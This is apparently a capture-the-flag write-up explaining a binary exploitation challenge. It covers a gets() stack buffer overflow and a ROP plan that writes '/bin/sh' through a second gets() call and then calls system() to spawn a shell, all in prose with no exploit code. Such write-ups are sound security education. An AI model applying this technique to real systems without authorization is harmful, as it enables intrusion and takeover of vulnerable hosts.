<h2>Binary Exploitation - 152 pts</h2>

<h4>Discussion</h4>

<h5>Program Behavior</h5>

<p>This program is very similar to the baby challenge - there is a vulnerable call to <code>gets()</code> to a buffer on the stack - except now there is a check on the buffer contents (notice that this does not affect our attack in any way), and, unfortunately, no convenient function that directly spawns a shell :)</p>

<p class = "caption">Figure 1. Buffer overflow vulnerability in <code>main()</code>.</p>

<h5>ROP Exploit</h5>

<p>Since the stack is non-executable, we will have to ROP our way to a shell. In a typical exploit, because the target system usually has ASLR (address-space layout randomization) enabled, we will need to leak an address in libc with a ROP chain that calls <code>puts()</code> or <code>printf()</code>. However, note that this binary does not call either of these functions (the text is printed with <code>system("cat &lt;text to print&gt;")</code>). While this does eliminate the need to locate the address of <code>system()</code> (we can just call its address in the PLT), we still can't spawn a shell because we also need a pointer to the string <code>/bin/sh</code>.</p>

<p>When a known string is not available to us, the natural question to ask next is whether we can generate this string ourselves. Since here we have access to <code>gets()</code>, we can. Simply find a writeable address, call <code>gets()</code>, and finally call <code>system()</code> with that address as argument. The program will again wait for our input, and by submitting <code>/bin/sh</code>, we will get a shell.</p>
